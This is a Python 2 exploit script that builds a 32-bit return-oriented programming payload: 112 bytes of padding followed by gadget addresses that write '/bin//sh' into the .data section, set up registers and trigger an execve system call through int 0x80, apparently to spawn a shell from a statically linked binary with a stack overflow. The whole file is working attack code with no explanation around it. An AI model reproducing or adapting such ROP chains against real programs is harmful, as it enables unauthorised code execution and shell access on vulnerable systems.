from struct import pack

# Padding goes here
p = '\xAA' * (112)

p += pack('<I', 0x0805733a) # pop edx ; ret
p += pack('<I', 0x080ef060) # @ .data
p += pack('<I', 0x080c2356) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0808e97d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0805733a) # pop edx ; ret
p += pack('<I', 0x080ef064) # @ .data + 4
p += pack('<I', 0x080c2356) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0808e97d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0805733a) # pop edx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x08051750) # xor eax, eax ; ret
p += pack('<I', 0x0808e97d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481ec) # pop ebx ; ret
p += pack('<I', 0x080ef060) # @ .data
p += pack('<I', 0x080e3d46) # pop ecx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x0805733a) # pop edx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8

p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret
p += pack('<I', 0x0807c596) # inc eax ; push es ; pop edi ; ret

p += pack('<I', 0x080494f9) # int 0x80

print p

